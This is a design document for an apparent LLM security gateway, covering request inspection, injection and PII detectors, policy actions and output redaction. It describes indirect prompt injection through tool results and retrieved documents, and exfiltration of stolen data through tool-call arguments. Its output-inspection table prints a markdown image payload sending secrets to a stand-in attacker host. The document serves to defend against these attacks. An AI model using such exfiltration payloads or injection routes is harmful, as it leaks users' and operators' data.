# Request and Response Flow

The complete inbound path for `POST /v1/chat/completions`. Each numbered stage names the
module that owns it, what can go wrong, and what the client sees when it does.

```
                          client request
                                │
 ┌──────────────────────────────▼───────────────────────────────┐
 │ 1. Middleware                                                │
 │    request-id · body limit (413) · timer start · headers     │
 └──────────────────────────────┬───────────────────────────────┘
                                │
 ┌──────────────────────────────▼───────────────────────────────┐
 │ 2. Schema validation        malformed → 400                  │
 │    stream:true → 400 unsupported_feature                     │
 └──────────────────────────────┬───────────────────────────────┘
                                │
 ┌──────────────────────────────▼───────────────────────────────┐
 │ 3. Extract inspectable messages (role filter, char budget)   │
 └──────────────────────────────┬───────────────────────────────┘
                                │
 ┌──────────────────────────────▼───────────────────────────────┐
 │ 4. Normalise → DetectionContext (raw + normalised + decoded) │
 └──────────────────────────────┬───────────────────────────────┘
                                │
 ┌──────────────────────────────▼───────────────────────────────┐
 │ 5. Input detector pipeline (concurrent, each guarded by      │
 │    timeout + error policy)                                   │
 │       injection · jailbreak · pii                            │
 └──────────────────────────────┬───────────────────────────────┘
                                │
 ┌──────────────────────────────▼───────────────────────────────┐
 │ 6. Policy engine → PolicyDecision                            │
 └───────┬──────────────┬───────────────┬───────────────┬───────┘
      BLOCK          REDACT           WARN            ALLOW
         │              │                │              │
   403 + event   rewrite body      annotate       forward as-is
                 then forward       then forward
                        │                │              │
 ┌──────────────────────▼────────────────▼──────────────▼───────┐
 │ 7. Upstream call (pooled httpx, timeout budget)              │
 │    connect/read failure → 502 / 504, body never reflected    │
 └──────────────────────────────┬───────────────────────────────┘
                                │
 ┌──────────────────────────────▼───────────────────────────────┐
 │ 8. Output detector pipeline → 9. policy → redact / block     │
 └──────────────────────────────┬───────────────────────────────┘
                                │
 ┌──────────────────────────────▼───────────────────────────────┐
 │ 10. Emit security event + metrics · 11. respond              │
 └──────────────────────────────────────────────────────────────┘
```

---

## 1. Middleware

**Owner:** `app/middleware/`

| Concern | Behaviour |
|---|---|
| Correlation ID | Reuse a valid client `X-Request-ID`, else generate one. Client values are untrusted: bounded to 128 chars, alphanumeric plus `-_:.` only, so they cannot inject newlines into logs. Echoed back on every response including errors. |
| Body size | Reject over `max_request_bytes` (default 256 KiB) with `413`. Enforced on `Content-Length` **and** while streaming the body, so a chunked request cannot bypass it. |
| Timing | Monotonic clock started here; total gateway time is measured across the whole middleware stack, not just the handler. |
| Security headers | `X-Content-Type-Options: nosniff`, `Cache-Control: no-store` (responses may contain sensitive completions), `Referrer-Policy: no-referrer`. |
| Error envelope | One exception handler converts every `FirewallError` and every unhandled exception into the OpenAI error shape. Unhandled exceptions log a stack trace server-side and return a generic message — internal details are never returned to the client. |

**Order matters.** Request-ID is outermost so that *every* subsequent failure, including a
413, is correlated and audited.

## 2. Schema validation

**Owner:** `app/gateway/openai_schema.py`

Pydantic models for the supported subset of the chat-completions request. Unknown fields
are preserved and forwarded rather than dropped — the gateway must not silently break a
provider feature it has not heard of. Validation failure returns `400` with an
`invalid_request_error` envelope.

`stream: true` is rejected with `400 unsupported_feature` and a message pointing at
[output-inspection.md](03-request-response-flow.md). Rationale in
[ADR-004](adr/ADR-004-openai-compatible-contract.md): a firewall that streams bytes it
has not inspected provides no guarantee, and silently buffering a stream while claiming
support would be a lie about the contract.

## 3. Extract inspectable messages

**Owner:** `app/gateway/translate.py`

Not every message is inspected, and this is a security-relevant choice:

| Role | Inspected by default | Why |
|---|---|---|
| `user` | ✅ | Direct injection and user-supplied PII. |
| `tool` | ✅ | **The indirect-injection surface.** Retrieved documents, search results and tool output are attacker-controlled in any RAG or agent system, and are the channel most real-world injections arrive through. |
| `system` | ❌ | Authored by the application operator; treating it as hostile produces constant false positives. Configurable — an operator who templates user data into the system prompt should enable it. |
| `assistant` | ❌ | Prior assistant turns were already inspected on their way out. |
| `developer` | ❌ | Same trust class as `system`. |

Controlled by `inspect_roles` in policy YAML. Content is truncated to `max_inspect_chars`
per message; the truncation is recorded on the event so a partial inspection is never
mistaken for a clean one.

Multi-part content (text + image blocks) has its text parts extracted; non-text parts are
counted and recorded but not inspected in Phase 0 (documented limitation).

### 3a. Source classification ([ADR-017](adr/ADR-017-provenance-aware-detection-context.md))

The table above conflates two things that are not the same: the **role** the wire
said, and where the bytes actually **came from**. A RAG application concatenates a
retrieved document into a `user` turn, and the gateway sees `role=user` with no way
to know that half the text is attacker-controlled. That is measured, not
hypothetical: indirect-injection recall is 0.1423, and 7.7x lower when a payload is
planted in a document than when the user asks for the override themselves
([ADR-016](adr/ADR-016-provenance-aware-detection.md)).

ADR-017 designs a **source-classification step here**, immediately before part
extraction and before normalisation. It is the point at which provenance becomes
authoritative; after it, `DetectionContext` is frozen and nothing may rewrite it.

```
message  ──▶  [ source classification ]  ──▶  part extraction  ──▶  normalisation
                      │
                      ├─ honour an inline claim ONLY if the channel is configured-trusted
                      └─ otherwise derive from role:
                           system/developer → SYSTEM_CONFIG / OPERATOR
                           user             → USER_INPUT    / PRINCIPAL
                           tool             → TOOL_RESULT   / UNTRUSTED
                           unrecognised     → UNKNOWN       / UNKNOWN
```

`tool` derives `UNTRUSTED` rather than `DERIVED` — making explicit the assumption
the `inspect_roles` default already encodes.

**Implemented (Phase A+B).** `build_contexts` assigns provenance and trust here,
before part extraction and before normalisation, and `DetectionContext` carries
them. **Nothing acts on them yet** — the `by_trust` policy overlay is Phase C — so
every decision is identical to the pre-provenance behaviour, which is asserted by
`tests/security/test_provenance_golden_behaviour.py`.

The inline-claim channel exists and is **off by default**
(`FIREWALL_TRUST_INLINE_PROVENANCE_CLAIMS=false`). With it off, no caller-supplied
value influences the assignment at all. With it on, a claim may only *lower*
trust; no trust key is ever read from the wire.

## 4. Normalisation

**Owner:** `app/core/normalize.py`

Produces a `DetectionContext` carrying **three** views of the same message:

* `raw_text` — exactly what the client sent. Redaction spans and audit hashes refer to this.
* `normalized_text` — invisible characters stripped, Unicode confusables folded, NFKC,
  casefolded, whitespace collapsed. This is what pattern-based detectors match on.
* `decoded_segments` — base64 payloads found in the raw text, decoded and surfaced so
  every detector can inspect them without re-implementing decoding.

Normalisation is **index-preserving**: it carries an offset map from each normalised
character back to its source offset, so a detector may match on normalised text and still
emit a redaction span that is valid against the original bytes. Without this, PII redaction
and confusable-resistant matching are mutually exclusive.

Normalised text is used **only for inspection**. The text forwarded upstream is always the
original (or the redacted original) — the gateway must never change the meaning of a
request as a side effect of inspecting it.

**Provenance and normalisation.** Provenance attaches to the **whole
message part**, not to spans within it. That is a deliberate simplification: one
provenance value per context means the `normalized_offsets` invariant gains nothing
new to keep synchronised, and ADR-010's guarantee is preserved by construction
rather than by care. Span-level provenance is rejected until a concrete requirement
exists; mixed-source parts are handled by splitting them into separate parts, or —
when that is impossible — by degrading the whole part to the **lowest** trust of its
constituents ([ADR-017](adr/ADR-017-provenance-aware-detection-context.md) §7).

## 5. Input detector pipeline

**Owner:** `app/detectors/pipeline.py` — detail in [detector-flow.md](05-detector-architecture.md).

Enabled detectors for `Direction.INPUT` run concurrently. Each is wrapped by
`GuardedDetector`, which applies a per-detector timeout, converts failures according to the
configured error policy, and records latency. A detector that hangs cannot hang the request.

## 6. Policy decision

**Owner:** `app/policy/engine.py` — detail in
[ADR-003](adr/ADR-003-policy-engine-design.md).

**One decision per inspectable message part.** Redaction spans are offsets into one specific
string, so merging them across messages would corrupt content. Each part therefore gets its
own `DetectionContext`, its own detector run and its own `PolicyDecision`; the request-level
outcome is the most severe of them (`engine.is_more_severe`), and redactions are applied
per part. This is why the engine's contract is "results for one inspected text" rather than
"results for one request".

Pure function. Collects every `DetectionResult`, compares each against its configured
threshold, and selects the **most severe** action any triggering detector maps to:
`BLOCK > REDACT > WARN > ALLOW`.

| Action | Effect on the request |
|---|---|
| `ALLOW` | Forwarded unchanged. |
| `WARN` | Forwarded unchanged; event recorded with `warned=true` and a metric incremented. Intended for shadow-mode rollout of a new detector. |
| `REDACT` | Spans replaced in the outgoing body, then forwarded. Only meaningful for detectors that emit spans (PII); a span-less detector configured to redact is a configuration error caught at startup. |
| `BLOCK` | Not forwarded. `403` with an OpenAI-shaped `security_block` error, the category, and the request ID. |

**The block response deliberately withholds detail.** It states the category and request ID,
never the matched rule, the score, or the offending substring. Returning that turns the
firewall into an oracle an attacker can iterate against; the detail goes to the audit log
where the operator can retrieve it by request ID.

## 7. Upstream call

**Owner:** `app/gateway/upstream.py`

One `httpx.AsyncClient` for the process lifetime, created in the FastAPI lifespan: HTTP
connection reuse is a first-order latency effect and creating a client per request is a
common and expensive mistake.

Timeout budget is explicit and separate — `connect`, `read`, `write`, `pool`. A slow
upstream must produce a clean `504`, never an exhausted worker.

Failure mapping:

| Upstream condition | Client sees |
|---|---|
| Connect failure / DNS | `502 upstream_error` |
| Read timeout | `504 upstream_timeout` |
| Upstream 4xx | Status preserved, body **not** reflected — a provider error body can contain the reflected prompt or provider internals. |
| Upstream 5xx | `502 upstream_error`, generic message. |

The upstream API key comes from `Settings` as a `SecretStr` and is attached at the client;
it never appears in a log line, a span attribute, or an audit record.

## 8–9. Output inspection and decision

Same pipeline machinery, `Direction.OUTPUT`, with output-side detectors. Detail in
[output-inspection.md](03-request-response-flow.md). The important asymmetry: a blocked *response*
means the upstream call has already been paid for and the model has already produced the
content — the firewall's job at that point is containment, not prevention.

## 10. Event emission

**Owner:** `app/observability/`, `app/database/`

One `SecurityEvent` per request describing what happened:

```
request_id · timestamp · model · upstream · direction · decision · category ·
triggering_detector · per-detector {score, detected, latency_ms, errored} ·
content hashes (never content) · token counts when the upstream reports them ·
gateway_latency_ms · upstream_latency_ms · detector_latency_ms · status_code
```

Emitted as a structured log line always, and persisted to PostgreSQL when
`persist_events` is on. Note that `gateway_latency_ms` excludes `upstream_latency_ms` by
construction — this is the number the benchmark in
[performance-benchmarking.md](15-performance-benchmarking.md) reports as
overhead, and it must be measurable per-request in production, not only in a benchmark rig.

## 11. Response

Body is the upstream response with any output redactions applied. Headers add
`X-Request-ID` and `X-Firewall-Decision` (`allow` / `warn` / `redact`), so a client can
detect that content was modified without parsing the body.

---

## Failure-mode summary

| Failure | Status | Behaviour |
|---|---|---|
| Body over limit | 413 | Rejected before full read |
| Malformed JSON / schema | 400 | Not forwarded |
| `stream: true` | 400 | Not forwarded, documented limitation |
| Detector timeout, `fail_closed` | 403 | Blocked, `category=detector_failure` |
| Detector timeout, `fail_open` | as decided | Recorded as errored; contributes nothing to the decision |
| All detectors error, `fail_closed` | 403 | Blocked |
| Upstream unreachable | 502 | Body never reflected |
| Upstream timeout | 504 | — |
| Database unavailable | 200/403 as decided | Request **succeeds**; audit failure is logged loudly and increments a metric. See [ADR-012](adr/ADR-012-persistence-and-retention.md) — the trade-off is stated explicitly, and the alternative (fail the request when the audit sink is down) is a configuration flag, not a rewrite. |

---

## Response path — output inspection


### Why the output side is a different problem

Input inspection is **prevention**: the request has not been sent, blocking costs nothing
but a rejection. Output inspection is **containment**: the upstream call is already paid
for, the model has already produced the content, and the only question left is whether the
client gets to see it.

This changes the economics of every decision:

* A false positive on output destroys a request the user already waited and paid for.
* `REDACT` is usually the correct action on output, where `BLOCK` is usually correct on
  input. This is why action is per-detector configuration and not a global setting.
* Output inspection latency is on the critical path *after* the slowest component has
  already run, so it is the most user-visible millisecond in the system.

### What is inspected

The assistant message content from each choice in the upstream response. Additionally
planned for Phase 3:

| Surface | Risk | Phase |
|---|---|---|
| `choices[].message.content` | PII leakage, policy-violating content, system-prompt disclosure | 3 |
| `choices[].message.tool_calls[].function.arguments` | **Exfiltration channel** — a successful injection makes the model *call a tool* with stolen data rather than print it. Inspecting only prose misses the actual attack. | 3 |
| `choices[].message.refusal` | benign | not inspected |
| Markdown image/link URLs in content | Classic data-exfiltration vector: `![](https://attacker/?d=<secrets>)` renders in a chat UI and performs a GET. | 3 |

Phase 0 wires the output pipeline and a registered stub detector so that the path, the
policy call, the event fields and the tests are real; the detectors that fill it arrive in
Phase 3.

### Output-side actions

| Action | Meaning | Typical use |
|---|---|---|
| `REDACT` | Replace spans in the response body, return `200` with `X-Firewall-Decision: redact` | PII in a completion |
| `BLOCK` | Discard the completion, return `403 security_block` | Disclosed system prompt, policy-violating content |
| `WARN` | Return unchanged, record the finding | Shadow-testing a new output detector |

Redaction is span-based against the original response text and replaces with a labelled
token (`<EMAIL_REDACTED>`), never a fixed-width mask. Labelled tokens keep the completion
readable and tell the downstream application *what* was removed.

When redaction changes content, the response's `usage` block is left untouched: it reports
what the upstream actually billed. Rewriting it to match the redacted text would be
falsifying an accounting record.

### The streaming problem

`stream: true` returns `400 unsupported_feature` in Phase 0/1. This is a deliberate,
documented refusal rather than a silent gap, and the reasoning is worth stating because
"add streaming" is the first thing anyone asks.

**Streaming and output inspection are fundamentally in tension.** Once a token has been
written to the client socket, it cannot be recalled. Three options exist and each costs
something real:

| Option | Guarantee | Cost |
|---|---|---|
| **A. Buffer fully, inspect, then emit** | Identical to non-streaming | Destroys time-to-first-token — the only reason to stream. Honest but pointless. |
| **B. Sliding-window inspection with bounded lookahead** | Detects anything contained within the window | Adds `window` tokens of latency; a finding spanning the window boundary is missed; partial tokens make span mapping hard |
| **C. Emit immediately, terminate the stream on detection** | Detects, but **after leaking** the prefix | The client has already received the sensitive prefix. This is what most "streaming-capable" guardrails actually do. |

Shipping C while advertising "streaming supported with output inspection" would be a false
security claim, which this project treats as worse than a missing feature.

**The Phase 6 design** is B, opt-in and explicit:

```
upstream SSE ──► ChunkBuffer(window_tokens=N) ──► inspect window ──► emit oldest chunk
                       │
                       └─ on BLOCK: emit SSE error event, close stream,
                          record event with `leaked_prefix_tokens` on the record
```

with these commitments:
* the window size is configuration, and its effect on TTFT is benchmarked and published;
* the event records how many tokens were emitted before a block, so the residual leak is
  *measured* rather than hand-waved;
* the API documents that streaming inspection is weaker than non-streaming inspection, and
  the difference is quantified on the same evaluation dataset.

Until that is built and measured, `400` is the honest answer.

### Failure semantics on the output side

If an output detector times out or raises, the same `on_error` policy applies. The default
for output detectors is `fail_closed`, and the consequence is deliberately uncomfortable:
the user is charged for a completion they do not receive. That is the correct trade for a
detector whose job is to stop a leak, and an operator who disagrees for a given detector
can set `fail_open` on it — as an explicit, reviewable configuration decision rather than
an accident.
